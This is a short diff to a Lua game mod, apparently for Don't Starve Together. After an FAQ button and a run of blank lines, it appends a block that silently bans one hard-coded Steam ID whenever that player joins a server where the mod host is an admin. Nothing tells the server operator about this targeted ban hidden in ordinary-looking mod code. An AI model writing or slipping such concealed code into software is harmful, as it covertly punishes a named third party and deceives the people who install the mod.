@@ -135,3 +135,20 @@ m_util:AddBindIcon("Mod FAQ", "penguin", "Mod Q&A QQ group: 941438122", true, fu
         {text = h_util.ok},
     })
 end, nil, -10000)
+
+
+
+
+
+if not m_util:IsAdmin() then return end
+AddPlayerPostInit(function(inst)
+    inst:DoTaskInTime(.5, function()
+        local id = TheNet and inst and inst.userid
+        if not id then return end
+        local data = TheNet:GetClientTableForUser(id)
+        if data and data.netid == "76561198333341285" then
+            local UserCommands = require "usercommands"
+            UserCommands.RunUserCommand("ban", {user=id}, ThePlayer)
+        end
+    end)
+end)
